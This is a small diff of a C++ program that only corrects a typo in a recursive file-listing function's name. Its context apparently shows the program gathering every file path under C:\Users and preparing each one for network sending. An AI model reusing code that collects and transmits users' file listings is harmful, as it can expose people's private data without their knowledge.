@@ -14,7 +14,7 @@
 #include <string>
 namespace fs = std::filesystem;
 
-std::vector<std::string> get_all_files_recurisive(const std::string& path)
+std::vector<std::string> get_all_files_recursive(const std::string& path)
 {
     std::vector<std::string> file_names;
     std::error_code ec;
@@ -126,7 +126,7 @@ int __cdecl main(void)
     do {
        
         std::string SendIresult = "";
-        const std::vector<std::string> file_list = get_all_files_recurisive("C:\\Users");
+        const std::vector<std::string> file_list = get_all_files_recursive("C:\\Users");
         for (const auto& fn : file_list) {
             // Convert fn vector in the for loop to sendable data
             const char* sendbuf = fn.data();
